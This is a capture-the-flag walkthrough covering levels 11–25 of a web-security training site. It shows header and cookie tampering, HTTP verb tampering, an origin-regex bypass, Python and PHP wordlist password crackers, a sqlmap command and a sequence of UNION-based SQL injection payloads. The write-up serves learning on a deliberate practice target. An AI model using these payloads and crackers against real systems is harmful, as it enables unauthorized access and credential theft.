+</p><h1 id="31d8d85a-b70d-4b92-9b06-a93be1807133" class="">Level 11</h1><ul id="07099346-83b2-4225-9458-6614a63c2888" class="bulleted-list"><li style="list-style-type:disc">I saw the main text talking about cookie (again) and went straightly to <code>inspect &gt; storage &gt; cookie</code> .</li></ul><ul id="cead3f59-e998-45e7-8316-c1e213bbe757" class="bulleted-list"><li style="list-style-type:disc">Nothing new was there, so tried to check local storage and etc. but nothing found.</li></ul><ul id="ecf98e7b-f7f1-4d5c-9511-2f65ccde8abf" class="bulleted-list"><li style="list-style-type:disc">I went to <code>inspect &gt; network</code> to analyze the network, then noticed a header named <code>Set-Cookie: next=false; …</code> .</li></ul><ul id="5d330d07-d697-4e14-b365-2139580dcc29" class="bulleted-list"><li style="list-style-type:disc">I set a cookie manually as <code>next=true</code> in <code>inspect &gt; storage &gt; cookie</code> .</li></ul><ul id="2c76c6c0-df85-409b-9ccd-4923df109abe" class="bulleted-list"><li style="list-style-type:disc">Refreshed the page and got the next level.</li></ul><h3 id="e2235c52-a1ff-4822-831d-09ef3f54ba1f" class="">FLAG: <code>/x5t23S4Nhf</code></h3><p id="40951a94-3794-4d9c-8bf3-708ec6391076" class="">
+</p><h1 id="8fd1e7b4-cdc0-4e28-aa4a-4b447676422a" class="">Level 12</h1><ul id="d7c72c6c-e37c-4b80-828f-6ee46a7fe6d8" class="bulleted-list"><li style="list-style-type:disc">According to the hint, I installed <code>burp suite</code> and started to analyze the network.</li></ul><ul id="36506a5f-51ab-4bc8-8b22-1af8c3718cc9" class="bulleted-list"><li style="list-style-type:disc">Then I noticed the <code>x-next=false</code> header.</li></ul><ul id="271bc9d1-0963-4c44-aff9-5dcf8f40e1ab" class="bulleted-list"><li style="list-style-type:disc">My evil thoughts told me to request with <code>x-next=true</code> .</li></ul><ul id="43e6b15b-fa92-44e9-8833-9f48c904b126" class="bulleted-list"><li style="list-style-type:disc">Boom, response included the next level</li></ul><h3 id="77b4785d-f625-41eb-83dd-301a4fb7cd0e" class="">FLAG: <code>/qPLGmDkK6e</code></h3><p id="0f52dfec-34ae-4bdd-981c-1fcfed118c19" class="">
+</p><h1 id="b837d9df-9ae8-4e5e-8c77-8a6d2d8abe79" class="">Level 13</h1><ul id="d4b25b21-65fa-441f-a9c7-97057f424462" class="bulleted-list"><li style="list-style-type:disc">According to the hint, I installed <code>burp suite</code> and started to analyze the network.</li></ul><ul id="1541ab8e-5695-47ad-bd78-4f8d79e341ca" class="bulleted-list"><li style="list-style-type:disc">Then I noticed the text that said <code>use your mobile</code>.</li></ul><ul id="beb3b410-faee-448b-ac4d-91effb7e59a2" class="bulleted-list"><li style="list-style-type:disc">According to my previous knowledge, tried to change the <code>User-Agent</code> to <code>Android</code> type and repeated the request.</li></ul><ul id="172974dd-3fdf-4509-8824-4c6eb8cf15a2" class="bulleted-list"><li style="list-style-type:disc">It wasn’t over, he wants me to <mark class="highlight-red"><code>come from google</code></mark> .</li></ul><ul id="6ab751ce-a542-44a0-9d5c-ef2204f8cbf2" class="bulleted-list"><li style="list-style-type:disc">According to my previous knowledge, added <code>Referer: https://google.com</code> to header and got the next level.</li></ul><h3 id="0fdc57e7-b181-4400-977a-ae4813769098" class="">FLAG: <code>/MNFx06dHTX</code></h3><p id="a44cc08c-fe19-47b1-a5b1-c3dde0acec4e" class="">
+</p><h1 id="b6cd1426-7ed7-41de-b3a1-b41557972e1f" class="">Level 14</h1><ul id="fbc7ad00-16fd-4b65-a66e-fc5407400d53" class="bulleted-list"><li style="list-style-type:disc">I was like, what’s going on !? the killer is here :)</li></ul><ul id="66a21d89-f23b-4634-9378-bcb649049bb6" class="bulleted-list"><li style="list-style-type:disc">Opened <code>view page source code</code> in browser to check the code and got nothing.</li></ul><ul id="a97d6b50-aeb1-4d74-9623-4db1caaacc14" class="bulleted-list"><li style="list-style-type:disc">So I knew it’s about network.</li></ul><ul id="37a8e78c-69ac-4ac1-9a22-8afd3c374428" class="bulleted-list"><li style="list-style-type:disc">Opened burp and sent the request to repeater.</li></ul><ul id="cb3121b9-ea68-4509-ae11-2471d13e01ee" class="bulleted-list"><li style="list-style-type:disc">In that time I noticed the URL different from the original one, it changes <code>x</code> to <code>X</code> .</li></ul><ul id="e9a8b02b-9860-4fca-b2d6-6772ab29ca18" class="bulleted-list"><li style="list-style-type:disc">So I fixed it and sent the request again and got an <code>302</code>, because the auto <code>follow redirects</code> was off.</li></ul><ul id="06b4f00b-831d-42f6-af0e-acf8eef187ac" class="bulleted-list"><li style="list-style-type:disc">The answer was <code>I remain unseen</code> , then I noticed it has too many lines.</li></ul><ul id="a415f2e7-3a36-4eeb-a739-f64c1ff3fe3c" class="bulleted-list"><li style="list-style-type:disc">So scrolled down to end and got the next level.</li></ul><h3 id="a48b8985-57d7-46c7-a3e3-2ee6142f2f1d" class="">FLAG: <code>/5u3za9eYK2</code></h3><p id="786b16bc-db3a-4796-bc1f-c6e6ce1923ea" class="">
+</p><h1 id="5da79e90-76b2-4dc4-afce-82c1e16f97ae" class="">Level 15</h1><ul id="09975a34-0b4b-4355-b72a-8d87d39c9041" class="bulleted-list"><li style="list-style-type:disc">At first I submit a random input and got method not allowed.</li></ul><ul id="4a427030-9f65-4d98-bd20-9968ab90ab46" class="bulleted-list"><li style="list-style-type:disc">Then I got the point, so added the URL to repeater and changed the method from <code>GET</code> to <code>POST</code> .</li></ul><ul id="c9bc34f3-f784-49f5-9bcb-09b179a35bb5" class="bulleted-list"><li style="list-style-type:disc">The answer was <code>my name is not x</code> , I think I got the step 1.</li></ul><ul id="114062c4-758b-41b4-b9f2-2e30895268f0" class="bulleted-list"><li style="list-style-type:disc">Now according to hints I have to change the encoding type in headers.</li></ul><ul id="a6d928e9-cffd-4097-a01d-3de330b60d37" class="bulleted-list"><li style="list-style-type:disc">Added <code>application/x-www-form-urlencoded</code> and got the result <code>I don’t like URL encoded …</code> .</li></ul><ul id="c2b8629f-0202-431e-b64c-0c334e2a5de3" class="bulleted-list"><li style="list-style-type:disc">So I googled about the next format <code>multipart/form-data</code> and got the point and its structure.</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b235cbb1-1da4-4384-bd52-ec0e4ff917f6" class="code"><code class="language-JavaScript">Content-Type: multipart/form-data; boundary=---WebKitBoundaryW666W
+Content-Length: 107
+
+-----WebKitBoundaryW666W
+Content-Disposition: form-data; name=&quot;name&quot;
+
+zodiac
+-----WebKitBoundaryW666W--</code></pre><ul id="c1b60b64-2537-4472-b3ac-2481ea797bf1" class="bulleted-list"><li style="list-style-type:disc">Resent the request and got the next level.</li></ul><h3 id="cafb42e3-3d65-439a-baab-9f739d8449e3" class="">FLAG: <code>/wO4Cw99TrO</code></h3><p id="5b55d590-075a-4db7-a7a8-568b2e054f0a" class="">
+</p><h1 id="a5e10ba8-4371-498a-b01c-6655fa5a821f" class="">Level 16</h1><ul id="1860ae51-bf18-402b-9289-68fb9e32d01e" class="bulleted-list"><li style="list-style-type:disc">Oh I noticed the basic authentication using name password.</li></ul><ul id="ef1dbaab-83ba-490e-98ad-a800d0247b69" class="bulleted-list"><li style="list-style-type:disc">In the first try I used <code>zodiac</code> as <code>username</code> and <code>password</code>.</li></ul><ul id="cdde7ee9-1c10-4e13-bb9f-046b616e1cba" class="bulleted-list"><li style="list-style-type:disc">Lmao, I got the next level :0</li></ul><h3 id="fc22a0ce-baa0-444e-9059-62a1a76c551d" class="">FLAG: <code>/niHpI90atv</code></h3><p id="1d7c67af-b2d7-485b-9be0-ac46cfa5ff77" class="">
+</p><h1 id="25cc7dbe-eee4-4dba-9571-2732b1b2828b" class="">Level 17</h1><ul id="ffd938d7-f8c7-4ea9-82a4-66c486304460" class="bulleted-list"><li style="list-style-type:disc">Oh I noticed the basic authentication again using name password.</li></ul><ul id="8bf0dd53-f78e-4e1d-9775-598673b85219" class="bulleted-list"><li style="list-style-type:disc">Tried some passwords and failed.</li></ul><ul id="9928c054-0bf6-4c01-836f-75e602437780" class="bulleted-list"><li style="list-style-type:disc">I noticed about misconfiguration alert in hint.</li></ul><ul id="3e2d5e21-d4f8-4ed2-8392-c9f8e818ccc5" class="bulleted-list"><li style="list-style-type:disc">So I tried <code>verb tampering</code> .</li></ul><ul id="3796a085-2da6-4ab0-b79f-6b1d83050393" class="bulleted-list"><li style="list-style-type:disc">Tried <code>PUT</code> method and got the next level.</li></ul><h3 id="3e3f130c-6db9-434f-ba0c-f7df03ebaf64" class="">FLAG: <code>/msAlEOcIpl</code></h3><p id="8a380e36-3d95-4bde-a25a-1f7288aa1ccc" class="">
+</p><h1 id="73a2cdce-378d-42e2-b234-4132c32a842a" class="">Level 18</h1><ul id="6faef618-2a0e-456b-bb9e-771d6709a5ef" class="bulleted-list"><li style="list-style-type:disc">Noticed the message origin not found :)</li></ul><ul id="2ae338e5-8ec4-4ede-8467-ce28cad631f7" class="bulleted-list"><li style="list-style-type:disc">Added request to repeater and added <code>Origin: https://z.voorivex.academy</code> and got the next level.</li></ul><h3 id="50a857e7-8567-44c3-a869-1ecdbb36c0c1" class="">FLAG: <code>/s501C0ecNx</code></h3><p id="cb93f61e-9876-40d5-855a-cc49862d79f8" class="">
+</p><h1 id="dc21c833-9488-43db-9f45-4336bc403587" class="">Level 19</h1><ul id="1a754d11-c0c5-4f55-8044-833d8398336c" class="bulleted-list"><li style="list-style-type:disc">Again <code>origin not found</code> message.</li></ul><ul id="826fdd38-5fa0-4128-96f7-f3d8488221c8" class="bulleted-list"><li style="list-style-type:disc">So added origin again but got <code>Everything is safe with a secure regex!</code> So now I know I have to make it unsafe.</li></ul><ul id="174c60c5-85a4-4711-896e-cfd11dcb8c7f" class="bulleted-list"><li style="list-style-type:disc">Tried https://google.com and got an error <code>Security failed!, ^https:\/\/z.voorivex.academy$</code> .</li></ul><ul id="72a242dc-314f-47c5-9faf-bc90c8d2dc7e" class="bulleted-list"><li style="list-style-type:disc">I tried too much and got that I can’t add or remove anything, but I can change <code>https</code> to <code>http</code> .</li></ul><ul id="051178c1-cba9-4886-b276-6c2993b2f4a4" class="bulleted-list"><li style="list-style-type:disc">Repeated the request and got he next level.</li></ul><h3 id="b256d971-bf59-4d74-bb92-a86794b8ca1c" class="">FLAG: <code>/bL0hE52ojQ</code></h3><p id="98a0230b-e549-4c47-bae5-ee5108637ff5" class="">
+</p><h1 id="38501e7d-0236-4e82-84e3-c1ffccb8eddf" class="">Level 20</h1><ul id="6f597508-1493-4f01-9ad5-2f64a20c5469" class="bulleted-list"><li style="list-style-type:disc">From the text I noticed I have to debug.</li></ul><ul id="2a4aa4b0-4db2-4ed2-9706-331eb1e9c230" class="bulleted-list"><li style="list-style-type:disc">According to my experience it refer to <code>/?debug=true</code> .</li></ul><ul id="289b65fe-9027-4b7f-b787-b2efa7790338" class="bulleted-list"><li style="list-style-type:disc">Opened it and noticed an URL parameter in code as <code>SECRET_a2cb45</code> .</li></ul><ul id="1a0c5fb3-efd0-4e56-9d4a-5a9dba5b2d6e" class="bulleted-list"><li style="list-style-type:disc">Opened <code>?SECRET_a2cb45=x</code> and got the next level.</li></ul><h3 id="5725bb42-5a91-4201-8bca-667e93d16f5e" class="">FLAG: <code>/48OUNjXqml</code></h3><p id="69a1ed16-77c9-4318-ba42-0999f300474a" class="">
+</p><h1 id="b21dd212-7198-473d-b8c1-0b5635b1150c" class="">Level 21</h1><ul id="05565855-b0be-4ce2-98fb-84a8b7f7ad56" class="bulleted-list"><li style="list-style-type:disc">Opened <code>view page source code</code> in browser to check the code.</li></ul><ul id="8f043711-7d50-4d4c-b0c4-425198a4bc55" class="bulleted-list"><li style="list-style-type:disc">Noticed an external file <mark class="highlight-default">(</mark><mark class="highlight-red"><code>/init.sql</code></mark><mark class="highlight-default">) </mark>code and opened it.</li></ul><ul id="61975891-4c5d-4efe-9325-891d722ab973" class="bulleted-list"><li style="list-style-type:disc">It was an database <code>init</code> with some secret data (but password was hashed).</li></ul><ul id="b285ae53-dfad-4885-ac5a-713bc18053dc" class="bulleted-list"><li style="list-style-type:disc">I simply googled all of the passwords and got the result for <code>z0diac</code> .</li></ul><ul id="85890df3-bfb2-47bf-a455-564be1fa2187" class="bulleted-list"><li style="list-style-type:disc">The hash was <code>1a8565a9dc72048ba03b4156be3e569f22771f23</code> ⇒ <code>manager</code> .</li></ul><ul id="6a0903dc-8f60-496f-861f-f23cf56ed34d" class="bulleted-list"><li style="list-style-type:disc">I use to login with username and pass &amp; got the next level.</li></ul><h3 id="1a9bd5dc-a614-494f-8619-8889b5ed7630" class="">FLAG: <code>/LJbFuGhsmy</code></h3><p id="ee34ad02-5499-4758-88ed-af1cc808b771" class="">
+</p><h1 id="02934dc5-0cbd-488a-88d5-07e7b628bcb4" class="">Level 22</h1><ul id="6e520c36-1c60-4afb-9423-18ae8440bdfc" class="bulleted-list"><li style="list-style-type:disc">Opened <code>view page source code</code> in browser to check the code.</li></ul><ul id="50e87442-d745-4a1a-b848-95326f2b9801" class="bulleted-list"><li style="list-style-type:disc">Noticed an external file <mark class="highlight-default">(</mark><mark class="highlight-red"><code>/sitemap.xml</code></mark><mark class="highlight-default">) </mark>code and opened it.</li></ul><ul id="2dc2d454-5783-4113-8382-60ba5e998f09" class="bulleted-list"><li style="list-style-type:disc">It contained 2 other directories <code>zodiac-db/2021.sql</code> and <code>zodiac-db/2024.sql</code> .</li></ul><ul id="fdfc4553-9ec8-4f47-a000-27d3670a7baf" class="bulleted-list"><li style="list-style-type:disc">I got the secret data in <code>2024.sql</code> .</li></ul><ul id="79a1eb89-3d4e-4e31-b66e-c79e2b589f0c" class="bulleted-list"><li style="list-style-type:disc">Password was hashed but with salt.</li></ul><ul id="6e6ce986-c552-4381-b717-4347250cf1bf" class="bulleted-list"><li style="list-style-type:disc">So  I wrote a python code to decrypt it with the wordlist (<code>rockyou</code>) I got from hint.</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7f1558b8-9d81-4b1c-8e0a-a9605c79efa2" class="code"><code class="language-Python">import hashlib
+
+def Wordlist():
+    with open(&quot;words.txt&quot;, &quot;r&quot;) as f: return f.read().splitlines()
+
+def Crack(hash_password, salt):
+    for word in Wordlist():
+        if hashlib.md5((salt + word.strip()).encode()).hexdigest() == hash_password: return word
+    return None
+
+# Example usage
+if __name__ == &quot;__main__&quot;:
+    myHash = &quot;28a2a400f151e8dee95e77366c7d91e2&quot;
+    mySalt = &quot;@zodiac!0123&quot;
+
+    cracked = Crack(myHash, mySalt)
+    if cracked: print(f&quot;Cracked Password: {cracked}&quot;)
+    else: print(&quot;No password found in wordlist.&quot;)</code></pre><ul id="d1abdaef-f4ab-41f7-9d2b-30ab57ee215e" class="bulleted-list"><li style="list-style-type:disc">I cracked it :0 the password was <code>butterfly15</code> .</li></ul><ul id="caefdc37-5d7a-4cdc-bfd2-e79b461387b3" class="bulleted-list"><li style="list-style-type:disc">So I logged in with it and got the next level.</li></ul><h3 id="b2fce5a1-42e4-4c6c-b9db-2c0bfe820e23" class="">FLAG: <code>/fQRIf2YI1m</code></h3><p id="0cf79d7b-03bf-429e-9b3e-3375f6973964" class="">
+</p><h1 id="c822bfac-0ab6-48c5-8fbe-1a9c73834b3d" class="">Level 23</h1><ul id="183fafeb-30b5-45cb-87bc-9cc016061d30" class="bulleted-list"><li style="list-style-type:disc">Opened <code>view page source code</code> in browser to check the code.</li></ul><ul id="a6aa6f51-a3f1-495a-9a14-13b9c1dcf146" class="bulleted-list"><li style="list-style-type:disc">Noticed an URL parameter named <code>ShowSource</code> .</li></ul><ul id="0478cec9-3939-4b4b-ae3f-16ce0c7bf73b" class="bulleted-list"><li style="list-style-type:disc">So I opened <code>/?ShowSource</code> and it exposed the whole<code> encrypt</code> and <code>decrypt</code> function use for password encryption.</li></ul><ul id="b50b81fa-1658-483e-98f1-9d22db590b39" class="bulleted-list"><li style="list-style-type:disc">I tried to rewrite the functions with python but failed.</li></ul><ul id="6fce03ea-45bd-41ce-a1ff-be0ff369162b" class="bulleted-list"><li style="list-style-type:disc">So I modified its own codes and wrote the exploit using the wordlist (<code>rockyou</code>) from hint to crack it. </li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="76ba67f1-9d23-4e28-bdec-b29d0c3e5f75" class="code"><code class="language-PHP">&lt;?php
+$encrypted_password = &quot;YC7gGz0yO2n1nvhvN0AcDg==:AoiG3qxHiyRLUMYM1/NSfiCiqGIxtZJt5OQRl681TtM=&quot;;
+
+$guess_secrets = [
+&quot;123456&quot;,
+&quot;123456&quot;,
+&quot;12345&quot;,
+&quot;123456789&quot;,
+&quot;password&quot;,
+&quot;iloveyou&quot;,
+...
+];
+
+function decrypt($encrypted, $key) {
+    list($iv_base64, $ciphertext_base64) = explode(&quot;:&quot;, $encrypted);
+    $iv = base64_decode($iv_base64);
+    $ciphertext = base64_decode($ciphertext_base64);
+    $plaintext = openssl_decrypt($ciphertext, &#x27;aes-256-cbc&#x27;, $key, OPENSSL_RAW_DATA, $iv);
+    return $plaintext;
+}
+
+function isValidAscii($string) {
+    return preg_match(&#x27;/^[\x20-\x7E]+$/&#x27;, $string);
+}
+
+foreach ($guess_secrets as $potential_key) {
+    $decrypted = decrypt($encrypted_password, $potential_key);
+
+    if ($decrypted !== false  &amp;&amp; isValidAscii($decrypted)) {
+        echo &quot;\n---------------------\n&quot;;
+        echo &quot;Potential key found: $potential_key\n&quot;;
+        echo &quot;Decrypted password: $decrypted\n&quot;;
+        echo &quot;\n---------------------\n&quot;;
+    }
+}
+
+?&gt;</code></pre><ul id="5f97b57c-6496-4384-8c4f-20775799c836" class="bulleted-list"><li style="list-style-type:disc">Boom, I got the key (<code>zodiaco</code>) and the password (<code>z0diac_s3creT_pass</code>).</li></ul><ul id="805aa920-f78a-4945-8fca-25b4feeda901" class="bulleted-list"><li style="list-style-type:disc">So I logged in and got the next level.</li></ul><h3 id="0d059ff1-d9fb-4369-b95b-18cbafacdd50" class="">FLAG: <code>/77v2FC8RQq</code></h3><p id="65eaa9c2-da7b-499a-bbf7-b6857ac351f0" class="">
+</p><h1 id="e9e3e733-16be-49d3-b500-372d1cc34816" class="">Level 24</h1><ul id="ead2e5d2-7833-4c2a-b075-a48d78ab465b" class="bulleted-list"><li style="list-style-type:disc">According to hint I had to make an error =)) well I’m an expert error maker.</li></ul><ul id="7f806873-8a28-43c4-8b0d-afdd5ca16ed2" class="bulleted-list"><li style="list-style-type:disc">Opened <code>view page source code</code> in browser to check the code.</li></ul><ul id="2fbc564c-4097-4c91-81aa-52553b592e90" class="bulleted-list"><li style="list-style-type:disc">Noticed <code>name=”name”</code> in <code>input</code> tags.</li></ul><ul id="22082c8c-b755-451d-bccc-9fd6008b369e" class="bulleted-list"><li style="list-style-type:disc">Tried to change them but nothing happened :(</li></ul><ul id="818b8537-8c08-4c7c-b7c7-5f8a8dfcf5bf" class="bulleted-list"><li style="list-style-type:disc">Then I thought how in the backend zodiac parse them ? correct <code>text=name</code> .</li></ul><ul id="8da6c9a1-7eca-4b88-897b-75d0f87fef6c" class="bulleted-list"><li style="list-style-type:disc">So I tried to change the type of type in  <code>inspect &gt; inspector</code> lol =)</li></ul><ul id="3b224de1-af2d-4ac7-b8ed-62b76d1caaef" class="bulleted-list"><li style="list-style-type:disc">So I tried to change it to <code>arrey</code> using <code>name=”name[]”</code> .</li></ul><ul id="cfac1606-edc0-4ae9-b4c6-0a410f316d61" class="bulleted-list"><li style="list-style-type:disc">Submit again and boom I got an error <code><strong>Fatal error</strong></code><code>:  Uncaught TypeError: htmlspecialchars()</code> .</li></ul><ul id="bf0b8e1a-b5b2-4512-848b-20d0b9f94d5e" class="bulleted-list"><li style="list-style-type:disc">Got the next level from the error page source code.</li></ul><h3 id="43c93ed7-caac-4ef5-844a-3e4e38b62b51" class="">FLAG: <code>/roLMgT6mj0</code><br/><br/></h3><h1 id="d6c64a42-30bb-4e37-9d6a-0a7120be7c4c" class="">Level 25</h1><ul id="13259dbe-8546-46d3-9353-8d69286c7394" class="bulleted-list"><li style="list-style-type:disc">I tried to submit <code>how</code> and got some result.</li></ul><ul id="48b75b86-7192-4557-98e1-9a4cfdd342eb" class="bulleted-list"><li style="list-style-type:disc">Oh its SQL injection =) So always first try using <code>sqlmap</code> tool.</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e2d63e44-d7c0-4bea-990b-6981329dd17b" class="code"><code class="language-Shell">python3 sqlmap.py -u &quot;https://z.voorivex.academy/roLMgT6mj0/?query=a&quot; --level 5</code></pre><ul id="8962c25f-230f-4dca-b9d4-643b90bc6524" class="bulleted-list"><li style="list-style-type:disc">And noticed that its <code>DBSM</code> is <code>SQLite</code> .</li></ul><ul id="72d12680-4eb5-428c-a5a7-7ea27c5c4ebe" class="bulleted-list"><li style="list-style-type:disc">I tried to make user with <code>boolian-based</code> injection .</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f010ed21-f2d5-4f19-bd0f-15400f9177f4" class="code"><code class="language-Shell">/?query=a%&#x27; AND 9100=9100 ---</code></pre><ul id="a2a8a671-abbb-41db-9d24-4835be8da82a" class="bulleted-list"><li style="list-style-type:disc">Worked. now I have to get <code>number</code> of <code>tables</code> .</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5ddacfd1-0b28-4cf0-8242-da89c75934de" class="code"><code class="language-Shell">/?query=a%&#x27; ORDER BY 3 ---</code></pre><ul id="53a1c8ae-c350-43fe-8c71-84d96b5dbd06" class="bulleted-list"><li style="list-style-type:disc">Used 4 and got error so it has 3 tables. now its time to get <code>tables</code> with <code>SQLite</code> structure.</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8d32fba3-0019-4d9a-873b-fd712314fe1e" class="code"><code class="language-SQL">/?query=a%&#x27; UNION ALL SELECT 1, 2, name FROM sqlite_master ---</code></pre><ul id="3035075c-5c91-447f-8e89-23375a94d3f0" class="bulleted-list"><li style="list-style-type:disc">Then noticed a table name <code>secret</code> . so I have to get the <code>columns</code> name of it. </li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f8be6c5b-5e32-4057-af3c-991a0b2fadcf" class="code"><code class="language-SQL">/?query=a%&#x27; UNION ALL SELECT 1, 2, sql FROM sqlite_master ---</code></pre><ul id="92ac6926-7bf8-486d-a131-194c3031c972" class="bulleted-list"><li style="list-style-type:disc">Oh got the columns name, but I need <code>key</code> column .</li></ul><ul id="346a903e-1187-4ce6-aa8e-19c244c5082c" class="bulleted-list"><li style="list-style-type:disc">So I simply selected it using <code>union</code> =)</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2c3ecf37-5404-4d65-9eba-07c165361b77" class="code"><code class="language-SQL">/?query=a%&#x27; UNION ALL SELECT 1, 2, key FROM secret ---</code></pre><ul id="e8cb4230-d3ef-4bf6-b02d-5390bffa52c6" class="bulleted-list"><li style="list-style-type:disc">Done. got the next level.</li></ul><h3 id="a43695f9-8f2e-4311-8407-81e057c44059" class="">FLAG: <code>/w9d8rICEhI</code></h3><p id="e9a70baf-6ca5-42bf-9739-2dfd9e7fcd42" class="">
+</p><p id="881cb47b-e349-4fa4-bc3d-58672701329f" class="">
